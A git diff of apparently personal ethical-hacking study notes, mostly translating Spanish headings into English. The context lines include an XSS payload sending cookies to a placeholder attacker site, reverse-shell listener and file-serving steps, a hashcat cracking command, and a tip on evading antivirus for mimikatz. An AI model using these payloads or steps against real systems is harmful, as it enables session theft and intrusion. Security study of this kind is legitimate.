@@ -5,47 +5,47 @@ These are the notes I've been taking since I started learning about ethical hack
 
 <!-- TOC depthFrom:1 depthTo:6 withLinks:1 updateOnSave:1 orderedList:1 -->
 
-1. [Useful Things](#useful-things)
-2. [Identification of Radio Frequencies (NFC Cards)](#identificación-frequency-of-radio-cards-nfc)
-	1. [Dispositivos](#dispositivos)
-3. [Redes WIFI](#redes-wifi)
-	1. [Some Concepts] (#algunos-concepts)
-	2. [Ataques](#ataques)
-	3. [Tools] (#herramientas)
+1. [Useful things](#useful-things)
+2. [Identification of radio frequencies (NFC Cards)](#identification-of-radio-frequencies-nfc-cards)
+	1. [Devices](#devices)
+3. [Wireless networks](#wireless-networks)
+	1. [Some Concepts](#some-concepts)
+	2. [Attacks](#attacks)
+	3. [Tools](#tools)
 4. [SDR (Radio Hacking)](#sdr-radio-hacking)
-	1. [Concepts] (#conceptos)
-	2. [Fases](#fases)
-	3. [Tools] (#herramientas-1)
-5. [Cryptology](#criptología)
-	1. [Criptografía](#criptografía)
-		1. [Tipos](#tipos)
-		2. [Tools] (#herramientas-2)
-		3. [Dictionaries] (#diccionarios)
-		4. [Rules] (#reglas)
-	2. [Steganography] (#steganografía)
-		1. [Technical Steganography] (#steganografía-technical)
-			1. [Some Concepts] (#algunos-concepts-1)
-			2. [Técnicas](#técnicas)
-			3. [Various Steganography Tools (Each will use its algorithm)] (#herramientas-several-steganography-each-one-will-your-algorithm)
-			4. [Stegoanálisis](#stegoanálisis)
-				1. [Various Stegoanalysis Tools] (#herramientas-several-of-stegoanalysis)
-				2. [Recommended Readings] (#lecturas-recommended)
-		2. [Artistic Steganography] (#steganografía-artistic)
-6. [Forense](#forense)
-	1. [Capturas de ram](#capturas-de-ram)
+	1. [Concepts](#concepts)
+	2. [Phases](#phases)
+	3. [Tools](#tools-1)
+5. [Cryptology](#cryptology)
+	1. [Cryptography](#cryptography)
+		1. [Types](#types)
+		2. [Tools](#tools-2)
+		3. [Dictionaries](#dictionaries)
+		4. [Rules](#rules)
+	2. [Steganography](#steganography)
+		1. [Technical steganography](#technical-steganography)
+			1. [Some concepts](#some-concepts)
+			2. [Techniques](#techniques)
+			3. [Various steganography tools (Each will use its algorithm)](#various-steganography-tools-each-will-use-its-algorithm)
+			4. [Stegoanalysis](#stegoanalysis)
+				1. [Various stegoanalysis tools](#various-stegoanalysis-tools)
+				2. [Recommended readings](#recommended-readings)
+		2. [Artistic steganography](#artistic-steganography)
+6. [Forensic](#forensic)
+	1. [Ram-captures](#ram-captures)
 		1. [Volatility](#volatility)
 			1. [lsass.exe](#lsassexe)
-	2. [Imagen de disco](#imagen-de-disco)
+	2. [Disk-image](#disk-image)
 		1. [FTK Imager](#ftk-imager)
 7. [Hacking web](#hacking-web)
-	1. [Tools] (#herramientas-3)
-	2. [Ataques](#ataques-1)
-8. [Hacking Methodology (Pentest)](#metodología-of-hacking-pentest)
-	1. [Life Cycle of a Pentest] (#ciclo-of-life-of-a-pentest)
-		1. [Recognition (OSINT or Open Source Intelligence)] (#reconocimiento-osint-or-intelligence-from-open sources)
-		2. [Scanning and Enumeration] (#escaneo-and-enumeration)
-		3. [Gain Access and Scale Privileges] (#ganar-access-and-scale-privileges)
-		4. [Keep Access, Cover Trail and Report] (#mantener-access-cover-trace-and-report)
+	1. [Tools](#tools-3)
+	2. [Attacks](#attacks-1)
+8. [Hacking methodology (Pentest)](#hacking-methodology-pentest)
+	1. [Life cycle of a pentest](#life-cycle-of-a-pentest)
+		1. [Recognition (OSINT or Open Source Intelligence)](#recognition-osint-or-open-source-intelligence)
+		2. [Scanning and enumeration](#scanning-and-enumeration)
+		3. [Gaining access and scale privileges](#gaining-access-and-scaling-privileges)
+		4. [Maintain access, Cover trace and Report](#maintain-access-cover-trace-and-report)
 		
 <!-- /TOC -->
 
@@ -75,7 +75,7 @@ They work at 125 khz or 13.56 Mhz. You can read the information of a payment car
 	- What you download has several BAT files to do things. To flash the firmware, we look at which com port we have the proxmark and change it in the BAT file (All like this)
 
 # Wireless networks
-Some concepts
+## Some concepts
 - **Beacon Frames**: The mobile is asking if it has any of the networks to which it has been connected to vces. If someone is snorting, they could do a network "twin" and have the mobile connect F.
 - **Promiscuous Mode**: Our network card or WIFI must allow it in order to sniff the network
 
@@ -122,7 +122,7 @@ Some or more of the functions of the physical layer are defined by software: fil
 ## Concepts
 - **Shortwave:** Or High Frequency (HF)
 
-## Fases
+## Phases
 - **Sampling**
 - **Quantification**
 - **Signal encoding**
@@ -185,7 +185,7 @@ Information concealment techniques. Use videos, images or whatever as carriers o
 - **Entropy:** Measures the level of clutter of a file's information. A high entropy (can be calculated with `ent`) could indicate encoded or encrypted info, which may be malware, stego... **Care!** in steganography can lead to confusion, entropy may not vary and in addition some steganography algorithms or even common programs compress the file causing them to have even less entropy.
 - **There are:** File integrity checkers, antivirus systems, forensic analysis software, stipanalysis tools to check files
 
-#### Técnicas
+#### Techniques
 - **EoF:** Add information at the end of a structured file. If you zip up at the end of an image you can make unzip
 to the image to take out what you've compressed on the zip
 - **LSB (Least significant bit):** It is very common in images and video. Basically, it's taking the least significant bit of the RGB encoding of each pixel and changing it. We can put information in an image like this without really affecting colors too much. One method to extract the information would be through python with the Pillow or OpenCV library traversing pixel by pixel and taking out groups of bytes with the least significant bits of each pixel.
@@ -223,7 +223,7 @@ stegcracker: Brute force over Steghide's algorithm
 - **Ffmpeg**
 - **Docker stego-toolkit image** Includes all the tools in this section. It also has 2 scripts (*check_jpg.sh* and *check_png.sh*) that automate the launch of various stego analysis tools
 
-##### Lecturas recomendadas
+##### Recommended Readings
 - **Criptored de la UPM**
 - **Shonography and Shoanalysis**
 - **Seganography and Undercover Channels** - By Dr. Alfonso Muñoz
@@ -276,7 +276,7 @@ stegcracker: Brute force over Steghide's algorithm
 		- **OpenPuff**
 		- **Steganography Tools**
 
-# Forense
+# Forensic
 
 ## Ram captures
 
@@ -322,7 +322,7 @@ Anthares101@kali:~$ hashcat -m 13400 -a 0 -w 1 file dictionary --force --show #1
 
 # Hacking web
 
-• Tools
+## Tools
 
 - Basically use debugguer and browser console to defuse code and execute functions. You can also look at the network to look at requests (what is sent and received) to get information.
 - You can use curl to modify the headers that are sent to a website:
@@ -336,7 +336,7 @@ Anthares101@kali:~$ hashcat -m 13400 -a 0 -w 1 file dictionary --force --show #1
 - To remove all directories from a website we can use [gobuster](https://github.com/OJ/gobuster) or OWASP DirBuster
 - If you find a `.git` on a website, download it. [GitTools] (https://github.com/internetwache/GitTools) has interesting things to work with repositories (Like to download them from a website)
 
-## Ataques
+## Attacks
 
 - **Cross-site scripting:** Injection of malicious Javascript code into one page:
 	- A fairly silent payload (does no redirect) would be using AJAX: `<script>let request ? new XMLHttpRequest();request.open('GET', 'atackerSite?'+document.cookie, true);request.send();</script>`
@@ -540,8 +540,8 @@ the reverse shell we have on the computer from vulnerable SQL server.
 		- **`python3 -m http.server 80`:** In the directory where you have the `reverseShell` file
 		- **`nc -lvnp 443`:** To listen to the connection of the target machine that will provide us with a remote shell
 		- **`ufw allow from 10.10.10.27 proto tcp to any port 80,443`:** Open the specified ports if you have `Uncomplicated Firewall` 
-### Maintain Access, Cover Trace, and Report
+### Maintain access, Cover trace, and Report
 - **mimikatz:** Most commonly used to dump and crack passwords on Windows systems. You must disable the antivirus on the target machine or use an obfuscated version since being so used is easily detected
-- [**Command and Control Server:**]
+- **Command and Control Server:**
 	- [**Powershell Empire**](https://github.com/BC-SECURITY/Empire/)**:** Post-exploitation Framework. It has several useful tools and allows easy control of exploited machines
 	- [**Starkiller**](https://github.com/BC-SECURITY/Starkiller)**:** Frontend for Powershell Empire
